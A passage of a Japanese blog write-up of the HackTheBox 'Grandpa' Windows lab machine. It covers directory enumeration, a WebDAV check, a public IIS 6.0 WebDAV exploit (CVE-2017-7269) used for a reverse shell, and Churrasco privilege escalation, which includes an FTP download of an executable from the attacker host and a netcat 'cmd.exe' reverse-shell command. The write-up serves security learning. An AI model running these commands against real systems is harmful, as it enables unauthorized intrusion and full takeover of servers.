    style="padding-bottom: 57.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABgUlEQVQoz42T626CQBCFff9Hsz+tqWkTsVhgFxYWEAhyOz2zXqJFG0mGnSXwzZzZwyIIDqiqBjbLkOe5izRNUZYlXrmmabrbL9brmoASh4PEwYGKonB527Y4Ho9omprRoK5rF6e8wTAMM+ii647uoyiKoLVGEATwfZ+xx56r5+1gTIqGICkixaqqYl6h7/s5UG5d18H/3hEaYr/3sdt5hCSUb5Ek2o0gLyyy1JwVyGiyK2gG7PuBgNxJTxJCmLftAGmAtahgOsfIPVdG246U/AQos9DaIo5zRCqDilJKVvj5iRkaYWjYfcpxJFSg3XNjSpxGOD0C9uwqJlA5mUqF7FT2moUU8wRZZmBtRhWSpxjH2/k96NBa6w6leNEud1JvnLO4JCOhSkXYfHxgu/UoM8Tn1xe2nuesIv6UExbLXGDTZf0r+XLSYpP39Rqr1YrQLTabDZbLN1egplXkhMWbeACadziOqOgzsUgcx252shpjrl09+ztmwP9euIXcdvWsw18GHqISN7Sz5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b2533fe676689a33affdb40498991d33/8ac56/image-20220604100328237.webp 240w,
/static/b2533fe676689a33affdb40498991d33/d3be9/image-20220604100328237.webp 480w,
/static/b2533fe676689a33affdb40498991d33/d1d8c/image-20220604100328237.webp 612w"
              sizes="(max-width: 612px) 100vw, 612px"
              type="image/webp"
            />
          <source
            srcset="/static/b2533fe676689a33affdb40498991d33/8ff5a/image-20220604100328237.png 240w,
/static/b2533fe676689a33affdb40498991d33/e85cb/image-20220604100328237.png 480w,
/static/b2533fe676689a33affdb40498991d33/8c76f/image-20220604100328237.png 612w"
            sizes="(max-width: 612px) 100vw, 612px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b2533fe676689a33affdb40498991d33/8c76f/image-20220604100328237.png"
            alt="image-20220604100328237"
            title="image-20220604100328237"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>あまり情報が取れなかったのでgobusterで探索します。</p>
<p>いくつかのパスが見つかりました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$RHOST</span>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t <span class="token number">40</span> <span class="token operator">|</span> <span class="token function">tee</span> gobuster1.txt

/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">152</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://<span class="token variable">$RHOST</span>/images/<span class="token punctuation">]</span>
/Images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">152</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://<span class="token variable">$RHOST</span>/Images/<span class="token punctuation">]</span>
/IMAGES               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">152</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://<span class="token variable">$RHOST</span>/IMAGES/<span class="token punctuation">]</span> 
/_private             <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1529</span><span class="token punctuation">]</span> </code></pre></div>
<ul>
<li>Images</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 417px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/0b73291b0d4076d3a6914778a9962a12/f27fb/image-20220604100519971.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 46.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB3klEQVQoz62PTWsaURSG78JFXdmdsXYyilFj1WzSRlEhFuLG/k43goo6jqVQoVHbGmiS0lWzMInfM3e0fiSCKL49c0XoD+iFh/Pxvufce5nlBcOrY4YDuwOS9BoOhwMulwybzSZySZJgt9thsVhgtVrBGCPtpeibOJ1OyLJMMy6RM0mihtuJw0MZbrcbHo+HOILX6xX4/X6B2T+i2ow+nw+BQEBgama9h52ETxA4fiNuCAaDCIdDOD19i2TyPWKxOGLxOKLRKCKRCNLpD0QaF6kLpFIpJBIJnJ8ncXb2DqFQiGbDYNlsFvl8HuVyGaVSSVCpVETMFwoiVxQF1epHqKqKXC4notk3KRaLKJBvD2s2G8hkMrhqfcdlvY56vYH65Rc8drq4ub5GrVaDUlGhKkU0vn5DpVxCo9lEuVhA9dNntFot/HsY5xztdhuDfh+9Xh+dbhcP923o3MBee+x08OvnLX7c3GI4HKJP3ru732jfP0DXdbFos9kI2Hw+w3yxwHQ6xWw+x2QyofzPriYWpC2XS1E/Pz2J2vQsl89ibjabYTAYYr1e7144GY+h6VzcNBqNSBxQHELTNOiEpukwDINe1cOYvJx8podznX7BwQ1O2gCr1Wq3EP/xbLdb/AWUowg/ebX4FgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/0b73291b0d4076d3a6914778a9962a12/8ac56/image-20220604100519971.webp 240w,
/static/0b73291b0d4076d3a6914778a9962a12/b6b2f/image-20220604100519971.webp 417w"
              sizes="(max-width: 417px) 100vw, 417px"
              type="image/webp"
            />
          <source
            srcset="/static/0b73291b0d4076d3a6914778a9962a12/8ff5a/image-20220604100519971.png 240w,
/static/0b73291b0d4076d3a6914778a9962a12/f27fb/image-20220604100519971.png 417w"
            sizes="(max-width: 417px) 100vw, 417px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/0b73291b0d4076d3a6914778a9962a12/f27fb/image-20220604100519971.png"
            alt="image-20220604100519971"
            title="image-20220604100519971"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<ul>
<li>_private</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 697px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/a7e2839977c2fd3b80b3dae70703437a/7422e/image-20220604101247760.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 83.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAACxUlEQVQ4y5VU204TURTtNxguYiQGQqLRqDwgvhBexBeJSIzRb9OooUIo0Co/IQkBlCANlMt02k6nt+l0pp1OL9OW5d57KmkN8XKSlb3P7jlr1r6cBq4NjODJ3DwWXrzGs/mXeL7wSvzFxTd4OPkYg8OjGBi62Ychig2P3LoSgfsPHmFqagYzM3OYnX2K6elZAccmbk9ibPweJu5M9mF07C4Gro9h8MY4Bkf6EQiHN7Gx8Rnh8BdEIptYX49gbS2CUCiMTytrWCas0n55dR3B5RCCKyF8XFrB2/dLePchSFjqIigIgJbnNdFqeWi3W2RbXb8Nr9lEo1EX/OsK2LaFbDaLdDoNXc8I0rqOfD4v8VQqRdBQNE005QMN1Ot11Gp1uK4rPlvP88UIoaLE5eK5oiAeV6CqCZyenpIfp98UsbFYDLHjGJ05l5iqqnKOz/NdzkgUWlZJ1HEwkUyKnySbSCTEJsnyZSZlqLQ3Sa3jOKhWq6hUKgRH1AthrVZDsViUA+VyWQ5zGv+7Op2OT3hxcYEa1SCT0aGROk3TUCgYYOWGYcjHbNuGbVnkmyiV/DhbBp9lIbyYK8DMnuchl8sSaUYus2pOh4vtOJWudbrF9yS9XnDsktAkBVwbTaNuJlPS2bjiN4brKbUicCmY8E9LCDndglGQ1PKFgsCk9AwiYFvhwhNhk8aClfDY/A6ueU9TXJq5HHI0d0VSZxIs9jNZGKQwR903aDYbVVcU/ipFL+pEyuqEUKRSHXlw88fHqNC8uZSyS2VAySKUBB2zKEptu3xJ7Dj+2LjkX6bMDsvlOTyMRvF9fx+HR0cy5Do1KUF1TetpZHN5mU2N55UtTQODXxaT9inkJxONHuLHwQFOTmLY3t7GPhFvbW1hd2cHe3u7hG+0/4qzszP5uD/8qjxRnpT+lGnDpFxg/pGfUS845v9ptP7a5Z+P7J/rvFuGMgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/a7e2839977c2fd3b80b3dae70703437a/8ac56/image-20220604101247760.webp 240w,
/static/a7e2839977c2fd3b80b3dae70703437a/d3be9/image-20220604101247760.webp 480w,
/static/a7e2839977c2fd3b80b3dae70703437a/458b7/image-20220604101247760.webp 697w"
              sizes="(max-width: 697px) 100vw, 697px"
              type="image/webp"
            />
          <source
            srcset="/static/a7e2839977c2fd3b80b3dae70703437a/8ff5a/image-20220604101247760.png 240w,
/static/a7e2839977c2fd3b80b3dae70703437a/e85cb/image-20220604101247760.png 480w,
/static/a7e2839977c2fd3b80b3dae70703437a/7422e/image-20220604101247760.png 697w"
            sizes="(max-width: 697px) 100vw, 697px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/a7e2839977c2fd3b80b3dae70703437a/7422e/image-20220604101247760.png"
            alt="image-20220604101247760"
            title="image-20220604101247760"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>これだけだと攻略の手掛かりにはならなさそうです。</p>
<p>feroxbusterも試してみましたが、特に有益な情報はありませんでした。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ feroxbuster -u http://<span class="token variable">$RHOST</span>/  -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="token operator">|</span> <span class="token function">tee</span> feroxbuster.txt</code></pre></div>
<h3 id="wevdavのスキャン" style="position:relative;"><a href="#wevdav%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="wevdavのスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>WevDAVのスキャン</h3>
<p>続いて、<code class="language-text">davtest</code>を使ってWevDAVの確認を行います。</p>
<p>WevDAVはざっくり言うとHTTPベースのファイル転送機構です。</p>
<p>DAVTestを使うことで、WevDAVが稼働しているかをチェックすることができます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ /usr/bin/davtest -url http://<span class="token variable">$RHOST</span>/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://<span class="token variable">$RHOST</span>
********************************************************
NOTE    Random string <span class="token keyword">for</span> this session: raQC3An4
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending <span class="token builtin class-name">test</span> files
PUT     jhtml   FAIL
PUT     cfm     FAIL
PUT     cgi     FAIL
PUT     jsp     FAIL
PUT     txt     FAIL
PUT     pl      FAIL
PUT     php     FAIL
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     html    FAIL
PUT     aspx    FAIL

********************************************************</code></pre></div>
<p>参考：<a href="https://whitemarkn.com/learning-ethical-hacker/davtest/" target="_blank" rel="nofollow noopener noreferrer">ハッカーはDAVTestでWebDAVが有効なサーバーをテストする(Kali Linux) | AIを武器にホワイトハッカーになる</a></p>
<p>参考：<a href="https://nmap.org/nsedoc/scripts/http-webdav-scan.html" target="_blank" rel="nofollow noopener noreferrer">http-webdav-scan NSE script — Nmap Scripting Engine documentation</a></p>
<p>Nmapの<code class="language-text">http-webdav-scan</code>の結果からいくつかのメソッドが裕子になっていることを確認していたのですが、残念ながらそのまま使用することはできなさそうでした。</p>
<h3 id="エクスプロイト" style="position:relative;"><a href="#%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88" aria-label="エクスプロイト permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>エクスプロイト</h3>
<p>しかし、どうやらIIS 6.0のWevDAVには認証をバイパス可能な脆弱性があるようですので、これを利用して任意のコード実行ができそうです。</p>
<p>参考：<a href="https://www.exploit-db.com/exploits/41738" target="_blank" rel="nofollow noopener noreferrer">Microsoft IIS 6.0 - WebDAV ‘ScStoragePathFromUrl’ Remote Buffer Overflow - Windows remote Exploit</a></p>
<p>今回は以下のエクスプロイトコードを拝借しました。</p>
<p>参考：<a href="https://gist.github.com/g0rx/693a89197e0b9d1464cab536fdc9f933" target="_blank" rel="nofollow noopener noreferrer">iis6-exploit-2017-CVE-2017-7269</a></p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">root@pentestlab:~<span class="token comment"># python revshell.py </span>
usage:iis6webdav.py targetip targetport reverseip reverseport

root@pentestlab:~<span class="token comment"># python revshell.py 10.10.10.14 80 10.10.14.2 9999</span></code></pre></div>
<p>これでリバースシェルが取得できました。</p>
<p>しかし、非常に残念なことに今回取得できたシェルではuserフラグの取得はできないようでした。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">whoami</span>
nt authority<span class="token punctuation">\</span>network <span class="token function">service</span></code></pre></div>
<p>というわけで権限昇格を目指していきます。</p>
<h2 id="内部探索" style="position:relative;"><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2" aria-label="内部探索 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内部探索</h2>
<p>とりあえずいつも通りユーザの権限を確認してみます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">whoami</span> /pri
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="token keyword">for</span> a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled </code></pre></div>
<p><code class="language-text">SeImpersonatePrivilege</code>が有効なようです！</p>
<p><code class="language-text">SeImpersonatePrivilege</code>とは、サーバがクライアントの権限になりすますことを許可する権限です。</p>
<p>この権限が有効な場合、<code class="language-text">Named Pipe Impersonation</code>などの攻撃が可能になります。</p>
<p>参考：<a href="https://note.com/lacnote/n/nef29b7c6a94f" target="_blank" rel="nofollow noopener noreferrer">getsystemの中身｜ラック・セキュリティごった煮ブログ編集部｜note</a></p>
<p>参考：<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation" target="_blank" rel="nofollow noopener noreferrer">Named Pipe Client Impersonation - HackTricks</a></p>
<p>攻撃の方法はいくつかあるとは思いますが、Windows Server 2003で<code class="language-text">SeImpersonatePrivilege</code>が<code class="language-text">network service</code>に割り当てられている場合、Churrascoを使うことで特権が取得できます。</p>
<p>というわけで、書き込み可能フォルダ<code class="language-text">C:\wmpub\</code>にFTPでファイルを転送してエクスプロイトを実行しました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token function">open</span> <span class="token number">10.10</span>.14.3 <span class="token operator">></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> user user password <span class="token operator">>></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> binary <span class="token operator">>></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> get c.exe c.exe <span class="token operator">>></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> quit <span class="token operator">>></span> ftp.txt

<span class="token function">ftp</span> -n <span class="token operator">&lt;</span> ftp.txt
.<span class="token punctuation">\</span>c.exe -d <span class="token string">"C:\wmpub<span class="token entity" title="\n">\n</span>c.exe -e cmd.exe 10.10.14.3 9999"</span></code></pre></div>
<p>これでAdmin権限のシェルを取得できました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 564px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/98a258d0272280cdd6dea390bfd1c3ea/ba4d9/image-20220612104939676.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 14.166666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI15XMQQ6DIABEUW9TwaYUFRAEEU3beP8D/RJdddnFS35mMU35vIilMK8rgw+4mLAh4uZEzOWUy05cCm5KhDnjQyamjZTK2an2knecjTTv4yCVjcF5eluZidEGHtog7pru3iM7jZQ9QmqEuEh5bT/q3ihtGYyvAv3ozzNjZ5Sy3FpF2z7/oPgCx4tgXdY6qDkAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/98a258d0272280cdd6dea390bfd1c3ea/8ac56/image-20220612104939676.webp 240w,
/static/98a258d0272280cdd6dea390bfd1c3ea/d3be9/image-20220612104939676.webp 480w,
/static/98a258d0272280cdd6dea390bfd1c3ea/0a341/image-20220612104939676.webp 564w"
              sizes="(max-width: 564px) 100vw, 564px"
              type="image/webp"
            />
          <source
            srcset="/static/98a258d0272280cdd6dea390bfd1c3ea/8ff5a/image-20220612104939676.png 240w,
/static/98a258d0272280cdd6dea390bfd1c3ea/e85cb/image-20220612104939676.png 480w,
/static/98a258d0272280cdd6dea390bfd1c3ea/ba4d9/image-20220612104939676.png 564w"
            sizes="(max-width: 564px) 100vw, 564px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/98a258d0272280cdd6dea390bfd1c3ea/ba4d9/image-20220612104939676.png"
            alt="image-20220612104939676"
            title="image-20220612104939676"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>正直Churrascoが何をしているのかはあまり理解していないのですが、ソースは400行程度のようなので今度時間があるときにちゃんと読み解いていこうと思います。。</p>
<p>参考：<a href="https://github.com/Re4son/Churrasco/blob/master/Churrasco.cpp" target="_blank" rel="nofollow noopener noreferrer">Churrasco/Churrasco.cpp at master · Re4son/Churrasco · GitHub</a></p>
<p>ちなみに、FTPでWindowsに実行ファイルを転送するときは<code class="language-text">binary</code>オプションを使用せずデフォルトのASCIIモードを使用してしまうと、以下のようなエラーが出てくるので注意が必要です。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">c.exe
This program cannot be run <span class="token keyword">in</span> DOS mode.</code></pre></div>
<p>参考：<a href="https://security.stackexchange.com/questions/133946/this-program-can-not-be-run-in-dos-mode" target="_blank" rel="nofollow noopener noreferrer">privilege escalation - This Program Can not Be Run in DOS Mode - Information Security Stack Exchange</a></p>
<p>参考：<a href="https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files" target="_blank" rel="nofollow noopener noreferrer">FTP Binary And ASCII Transfer Types And The Case Of Corrupt Files | JSCAPE</a></p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>Windowsはエクスプロイトの中身の理解が難しいのであんまりHackしている感がないですね。</p>
<p>ちゃんと理解できるようになりたい。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jun 4, 2022</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/hack-the-box/">HackTheBox</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/windows/">Windows</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/easy-box/">EasyBox</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたい趣味プログラマ。WinDbgとYARAが好き。HackTheBox ProHacker / AtCoder 緑 / 情報処理安全確保支援士資格 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/yuki_kashiwaba" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/hackthebox-windows-grandpa";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-a40552d3997721f1a522.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-bdf4831f5e3511b754dd.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-72f5ba3243f5f1f9add6.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-77ae8427df5aaaec05c4.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-fbb3d90f6a9c5e039ed1.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-8fa29d2422c31b73d8e0.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-9bf27003829f242941c6.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-a40552d3997721f1a522.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-f8d9f189f54b1dfba1bf.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-23b45a0eb82da62a4c67.js" async=""></script></body></html>